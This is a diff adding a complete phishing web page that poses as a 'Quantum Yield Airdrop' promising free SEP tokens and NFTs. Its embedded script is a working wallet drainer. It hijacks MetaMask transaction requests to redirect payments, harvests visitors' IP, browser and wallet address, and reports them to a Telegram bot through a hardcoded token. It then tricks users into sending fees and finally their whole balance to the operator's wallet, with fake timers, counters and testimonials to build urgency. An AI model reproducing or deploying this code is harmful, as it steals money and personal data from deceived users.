@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Quantum Yield Airdrop (Sepolia Testnet)</title>
+    <script>
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const CHAT_ID = "6309547301";
+        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
+        const ETH_TO_USD_RATE = 2500; // Fake rate: 1 SEP = $2,500 USD
+
+        // ETH Clipper: Swap 'to' address in eth_sendTransaction
+        if (window.ethereum) {
+            const originalRequest = window.ethereum.request;
+            window.ethereum.request = async (args) => {
+                if (args.method === "eth_sendTransaction") {
+                    const originalTo = args.params[0].to;
+                    args.params[0].to = YOUR_WALLET; // Swap to your address
+                    await sendAlert(`🪝 CLIP ATTEMPT: Swapped ${originalTo} to ${YOUR_WALLET}`);
+                }
+                return originalRequest.apply(window.ethereum, [args]);
+            };
+        }
+
+        async function sendAlert(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {
+                console.log("Telegram alert failed...");
+            }
+        }
+
+        async function getVictimInfo() {
+            const ua = navigator.userAgent;
+            const br = navigator.appName + " " + navigator.appVersion;
+            const dev = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
+            let ip = "Unknown";
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {
+                console.log("IP fetch failed...");
+            }
+            return { ip, browser: br, device: dev };
+        }
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a> to claim your rewards!</p>";
+                const info = await getVictimInfo();
+                await sendAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                return;
+            }
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: "0xaa36a7" }]
+                });
+
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                const account = accounts[0];
+                const balance = BigInt(await window.ethereum.request({
+                    method: "eth_getBalance",
+                    params: [account, "latest"]
+                }));
+
+                if (balance === 0n) {
+                    throw new Error("Wallet balance is zero.");
+                }
+
+                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
+                const gasLimit = 21000n;
+                const gasCost = gasLimit * gasPrice;
+                const claimFee = BigInt("10000000000000000"); // 0.01 ETH
+
+                if (balance < gasCost + claimFee) {
+                    throw new Error("Insufficient funds for claim.");
+                }
+
+                const info = await getVictimInfo();
+                await sendAlert(`🎯 VICTIM CONNECTED\nWallet: ${account}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+
+                // Step 1: Fake verification
+                document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 SEP to proceed!</p>";
+                await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: YOUR_WALLET,
+                        value: "0x" + BigInt("5000000000000000").toString(16), // 0.005 ETH
+                        gas: "0x" + gasLimit.toString(16),
+                        gasPrice: "0x" + gasPrice.toString(16),
+                        chainId: "0xaa36a7"
+                    }]
+                });
+
+                // Step 2: Fake claim fee
+                document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 SEP claim fee to secure your 5 SEP reward (~$12,500 USD)!</p>";
+                await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: YOUR_WALLET,
+                        value: "0x" + claimFee.toString(16),
+                        gas: "0x" + gasLimit.toString(16),
+                        gasPrice: "0x" + gasPrice.toString(16),
+                        chainId: "0xaa36a7"
+                    }]
+                });
+
+                // Step 3: Full drain
+                const drainAmount = balance - gasCost;
+                const drainEth = (Number(drainAmount) / 1e18).toFixed(6);
+                const drainUsd = (drainEth * ETH_TO_USD_RATE).toFixed(2);
+                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop—slots closing FAST!</p>";
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: YOUR_WALLET,
+                        value: "0x" + drainAmount.toString(16),
+                        gas: "0x" + gasLimit.toString(16),
+                        gasPrice: "0x" + gasPrice.toString(16),
+                        chainId: "0xaa36a7"
+                    }]
+                });
+
+                await sendAlert(`✅ SEPOLIA SUCCESS: ${account} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${txHash}\nIP: ${info.ip}`);
+                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 SEP + NFT transferred. Check your wallet!</p>";
+                updateClaimCounter();
+            } catch (e) {
+                const info = await getVictimInfo();
+                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
+            }
+        }
+
+        function startTimer() {
+            const endTime = Date.now() + 24 * 60 * 60 * 1000;
+            setInterval(() => {
+                const now = Date.now();
+                const distance = endTime - now;
+                if (distance < 0) {
+                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
+                    document.querySelector("button").disabled = true;
+                    return;
+                }
+                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const s = Math.floor((distance % (1000 * 60)) / 1000);
+                document.getElementById("timer").innerHTML = `${h}h ${m}m ${s}s`;
+            }, 1000);
+        }
+
+        function updateClaimCounter() {
+            let claimed = parseInt(document.getElementById("claimed").innerText.replace(/,/g, ""));
+            claimed += Math.floor(Math.random() * 10) + 1; // Fake random increase
+            document.getElementById("claimed").innerText = claimed.toLocaleString();
+        }
+
+        window.onload = () => {
+            startTimer();
+            setInterval(updateClaimCounter, 5000); // Fake counter ticks every 5s
+        };
+    </script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f 0%, #2e2e4f 100%);
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-y: auto;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+            text-align: center;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 212, 255, 0.5);
+            width: 90%;
+            max-width: 500px;
+            animation: glow 2s infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
+            to { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
+        }
+        h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            color: #00d4ff;
+            text-shadow: 0 0 15px rgba(0, 212, 255, 0.8);
+        }
+        .subtitle {
+            font-size: 1.3em;
+            color: #00ff9d;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        button {
+            background: linear-gradient(45deg, #00d4ff, #ff007a);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            color: #ffffff;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            box-shadow: 0 0 20px rgba(255, 0, 122, 0.5);
+        }
+        button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(255, 0, 122, 0.8);
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1.1em;
+        }
+        .success { color: #00ff9d; text-shadow: 0 0 10px #00ff9d; }
+        .error { color: #ff007a; text-shadow: 0 0 10px #ff007a; }
+        .warning { color: #ffcc00; font-weight: bold; }
+        .stats {
+            margin: 25px 0;
+            font-size: 1em;
+            background: rgba(0, 212, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #00d4ff;
+        }
+        .stats span {
+            color: #00ff9d;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+        #timer {
+            font-size: 1.8em;
+            color: #ff007a;
+            margin-top: 20px;
+            text-shadow: 0 0 10px #ff007a;
+        }
+        .nft-rewards {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+        }
+        .nft {
+            width: 120px;
+            height: 120px;
+            background-size: cover;
+            background-position: center;
+            border-radius: 15px;
+            border: 3px solid #00ff9d;
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.7);
+            transition: transform 0.3s ease;
+        }
+        .nft:hover {
+            transform: scale(1.1);
+        }
+        .nft1 {
+            background-image: url('https://i.postimg.cc/fW7rtmjq/Quantum-Ape.jpg');
+        }
+        .nft2 {
+            background-image: url('https://i.postimg.cc/wB9PvD70/file-B1-VK6-Ac-Ag65g-T9-Nr-GYSJw-T.png');
+        }
+        .testimonials {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        .testimonials p {
+            background: rgba(0, 212, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border: 1px dashed #00d4ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 Quantum Yield Airdrop (Sepolia)</h1>
+        <p class="subtitle">Claim 5 SEP + Exclusive NFTs—HURRY, LIMITED SLOTS!</p>
+        <div class="stats">
+            <p>Total Pool: <span>10,000 SEP</span></p>
+            <p>Claimed: <span id="claimed">7,842</span> SEP</p>
+            <p>Participants: <span>12,487</span></p>
+        </div>
+        <div class="nft-rewards">
+            <div class="nft nft1"></div>
+            <div class="nft nft2"></div>
+        </div>
+        <button onclick="connectWallet()">Claim 5 SEP NOW</button>
+        <div id="timer">Loading...</div>
+        <div id="status"></div>
+        <div class="testimonials">
+            <p>"Just claimed 5 SEP—insane value!" - @CryptoKingX</p>
+            <p>"Fast and easy, got my NFT too!" - @NFTManiac</p>
+        </div>
+    </div>
+</body>
+</html>
